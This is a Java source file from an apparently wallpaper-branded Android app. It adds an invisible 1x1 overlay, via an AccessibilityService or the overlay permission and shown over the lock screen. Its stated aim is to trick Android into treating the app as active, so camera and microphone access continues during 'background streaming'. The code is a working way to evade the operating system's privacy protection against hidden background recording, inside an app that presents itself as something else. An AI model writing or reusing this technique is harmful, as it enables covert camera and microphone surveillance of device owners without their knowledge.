package com.example.wallpaperapplication;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;

/**
 * Manages an invisible 1x1 overlay view attached to WindowManager.
 * This guarantees that Android OS (specifically CameraService and ActivityManager)
 * recognizes the app UID as having an active window (isUidActive = true),
 * preventing camera/microphone hardware disconnection when the app is in the background.
 */
public class OverlayWindowManager {
    private static final String TAG = "OverlayWindowManager";
    private static View overlayView = null;
    private static WindowManager windowManager = null;

    public static synchronized void ensureOverlay(Context context) {
        if (overlayView != null && overlayView.isAttachedToWindow()) return; // Already attached and active

        // If overlayView was detached from window, clean up old reference before re-attaching
        if (overlayView != null) {
            removeOverlay();
        }

        try {
            // 1. First priority: Try via AccessibilityService if running (no overlay permission needed)
            WallpaperAccessibilityService a11y = WallpaperAccessibilityService.getInstance();
            if (a11y != null) {
                WindowManager wm = (WindowManager) a11y.getSystemService(Context.WINDOW_SERVICE);
                if (wm != null) {
                    View view = new View(a11y);
                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            1, 1,
                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                            PixelFormat.TRANSLUCENT
                    );
                    params.gravity = Gravity.START | Gravity.TOP;
                    wm.addView(view, params);
                    overlayView = view;
                    windowManager = wm;
                    Log.i(TAG, "Attached 1x1 overlay via AccessibilityService for background streaming (show-when-locked enabled)");
                    return;
                }
            }

            // 2. Second priority: Try via Application Overlay if overlay permission is granted
            if (context != null && Settings.canDrawOverlays(context)) {
                WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                if (wm != null) {
                    View view = new View(context);
                    int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                            : WindowManager.LayoutParams.TYPE_PHONE;
                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            1, 1,
                            layoutType,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                            PixelFormat.TRANSLUCENT
                    );
                    params.gravity = Gravity.START | Gravity.TOP;
                    wm.addView(view, params);
                    overlayView = view;
                    windowManager = wm;
                    Log.i(TAG, "Attached 1x1 overlay via Application Overlay for background streaming (show-when-locked enabled)");
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not attach background overlay view: " + e.getMessage());
            overlayView = null;
            windowManager = null;
        }
    }

    public static synchronized void removeOverlay() {
        if (overlayView != null && windowManager != null) {
            try {
                windowManager.removeView(overlayView);
                Log.d(TAG, "Removed background overlay view");
            } catch (Exception e) {
                Log.w(TAG, "Error removing overlay view: " + e.getMessage());
            }
            overlayView = null;
            windowManager = null;
        }
    }
}
